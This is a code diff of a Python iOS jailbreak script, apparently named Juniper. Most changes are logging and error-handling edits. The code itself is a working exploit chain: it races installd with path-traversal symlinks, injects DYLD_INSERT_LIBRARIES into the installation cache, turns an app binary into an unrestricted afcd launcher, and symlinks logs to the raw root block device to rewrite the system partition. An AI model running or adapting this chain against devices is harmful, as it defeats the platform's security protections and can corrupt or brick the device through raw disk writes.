@@ -1,3 +1,7 @@
+#!/usr/bin/python
+
+from __future__ import print_function
+
 import sys, os
 import imobiledevice
 from imobiledevice import *
@@ -184,7 +188,6 @@ def race_installd(zip_file, destination):
 			with afc.open("/PublicStaging/" + zip_file, "w") as remote:
 				with open(zip_file, "r") as local:
 					remote.write(local.read())
-					print("Uploaded file!")
 			
 			options = plist.from_xml("<plist><dict><key>CFBundleIdentifier</key><string>juniper.installd.race</string></dict></plist>")
 			
@@ -218,10 +221,7 @@ def race_installd(zip_file, destination):
 							afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
 							raise StopIteration
 				except AfcError, e:
-					if e.code is 10:
-						raise StopIteration
-					else:
-						continue
+					continue
 	except StopIteration:
 		return True
 
@@ -233,15 +233,21 @@ def configure_system_stage_2():
 	
 	conn = fr.request_sources(["Caches"])
 	
+	data_length = 0
+	
 	with open("caches.cpio.gz", "wb+") as dumpfile:
-		while (1):
+		while True:
 			try:
 				data = conn.receive_timeout(4096, 10)
 				dumpfile.write(data)
+				
+				data_length += 4096
 			except Exception, e:
 				if e.code == -2:
-					break;
+					break
 				raise e
+			
+			print(" - " + str(data_length) + " bytes received!", end="\r")
 	
 	try:
 		libarchive.extract.extract_file("caches.cpio.gz")
@@ -249,7 +255,8 @@ def configure_system_stage_2():
 	except:
 		pass
 	
-	print(" - Got the cache!")
+	# The huge space here is to wipe the updating line.
+	print(" - Got the cache!           ")
 	
 	os.chdir("var/mobile/Library/Caches")
 	
@@ -264,14 +271,15 @@ def configure_system_stage_2():
 		for line in install_cache:
 			file_contents += line
 	
-			if line.find("com.trinitigame.jailbreakerfull") is not -1 and not no_more:
-				print("next instance")
+			if line.find("com.trinitigame.jailbreakerfull") != -1 and not no_more:
 				next_instance = True
 			
 			if next_instance and line.find("/tmp") is not -1:
 				file_contents += "\t\t\t\t<key>DYLD_INSERT_LIBRARIES</key>\n"
 				file_contents += "\t\t\t\t<string>/var/mobile/Media/Downloads/sandbox.dylib</string>\n"
+				
 				next_instance = False
+				
 				no_more = True
 	
 	with open("com.apple.mobile.installation.plist", "w") as install_cache:
@@ -289,20 +297,18 @@ def configure_system_stage_2():
 	ios_version = ld.get_value(None, "BuildVersion").get_value()
 	
 	with open("com.apple.backboardd.plist", "w") as backboardd:
-		backboardd.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
-		backboardd.write("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">")
-		backboardd.write("<plist version=\"1.0\">")
-		backboardd.write("<dict>")
-		backboardd.write("\t<key>BKDataMigratorLastSystemVersion</key>")
-		backboardd.write("\t<string>" + ios_version + "</string>")
-		backboardd.write("\t<key>BKNoWatchdogs</key>")
-		backboardd.write("\t<string>Yes</string>")
-		backboardd.write("\t<key>InvertColorsEnabled</key>")
-		backboardd.write("\t<false />")
-		backboardd.write("</dict>")
+		backboardd.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
+		backboardd.write("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n")
+		backboardd.write("<plist version=\"1.0\">\n")
+		backboardd.write("<dict>\n")
+		backboardd.write("\t<key>BKDataMigratorLastSystemVersion</key>\n")
+		backboardd.write("\t<string>" + ios_version + "</string>\n")
+		backboardd.write("\t<key>BKNoWatchdogs</key>\n")
+		backboardd.write("\t<string>Yes</string>\n")
+		backboardd.write("\t<key>InvertColorsEnabled</key>\n")
+		backboardd.write("\t<false />\n")
+		backboardd.write("</dict>\n")
 		backboardd.write("</plist>")
-	
-	call(["truncate", "-s", "1M", "AAAAABREATHESAAAAA"])
 	
 	with ZipFile("caches.zip", "w") as caches:
 		os.chdir("var/mobile/Library/Caches")
@@ -311,19 +317,21 @@ def configure_system_stage_2():
 		os.chdir(tmp_dir)
 	
 	with ZipFile("preferences.zip", "w") as preferences:
-		preferences.write("AAAAABREATHESAAAAA")
 		preferences.write("com.apple.backboardd.plist")
 	
-	print(" - Attempting to race installd (1)")
+	print(" - Attempting to race installd (caches)")
 	
-	if race_installd("caches.zip", "/var/mobile/Library/Caches/") == 1:
-		print(" - Success!")
+	if race_installd("caches.zip", "/var/mobile/Library/Caches/") != 1:
+		print("== Something went wrong, exiting ==")
+		
+		sys.exit(1)
 	
-	print(" - Attempting to race installd (2)")
-	print(" - (This one might take a bit longer, but don't worry!)")
+	print(" - Attempting to race installd (preferences)")
 	
-	if race_installd("preferences.zip", "/var/mobile/Library/Preferences/") == 1:
-		print(" - Success!")
+	if race_installd("preferences.zip", "/var/mobile/Library/Preferences/") != 1:
+		print("== Something went wrong, exiting ==")
+		
+		sys.exit(1)
 	
 	print(" - Rebooting, please click on the Juniper app when I say so!")
 	
@@ -331,6 +339,8 @@ def configure_system_stage_2():
 
 def get_unrestricted_afc():
 	ld = get_lockdown()
+	
+	port = 0
 	
 	while True:
 		try:
@@ -341,8 +351,10 @@ def get_unrestricted_afc():
 	
 	afc = get_afc()
 	
-	with afc.open("/Downloads/Jailbreaker.app/Jailbreaker", "w") as executable:
+	with afc.open("/Downloads/Jailbreaker.app/Jailbreaker", mode="w") as executable:
 		executable.write("#!/usr/libexec/afcd -S -d / -p " + str(port) + " # -- ")
+	
+	print(" - Port: " + str(port))
 	
 	print("== Alright, click on the icon! ==")
 	
@@ -359,7 +371,7 @@ def own_block_device():
 	
 	ld = get_lockdown()
 	
-	afc = get_afc()
+	afc = get_afc() #ld.get_service_client(AfcClient)
 	drr = get_drr()
 	
 	afc_unrestricted = get_unrestricted_afc()
@@ -370,6 +382,8 @@ def own_block_device():
 		afc_unrestricted.rename_path("/var/mobile/Library/Logs/AppleSupport", "/var/mobile/Library/Logs/AppleSupport_moved")
 		
 		afc_unrestricted.symlink("../../../../../dev/rdisk0s1s1", "/var/mobile/Library/Logs/AppleSupport")
+	
+	print(" - Rebooting, please click on the icon again when I say so!")
 	
 	drr.restart(0)
 
@@ -384,8 +398,10 @@ def modify_root_filesystem():
 	afc_unrestricted.remove_path("/var/mobile/Library/Logs/AppleSupport")
 	afc_unrestricted.rename_path("/var/mobile/Library/Logs/AppleSupport_moved", "/var/mobile/Library/Logs/AppleSupport")
 	
+	print(" - Moved directories back")
+	
 	try:
-		with afc_unrestricted.open("/dev/rdisk0s1s1", "rb") as block:
+		with afc_unrestricted.open("/dev/rdisk0s1s1", "r") as block:
 			with open(os.path.join(tmp_dir, "block")) as local_block:
 				block_info = afc_unrestricted.get_file_info("/dev/rdisk0s1s1")
 				
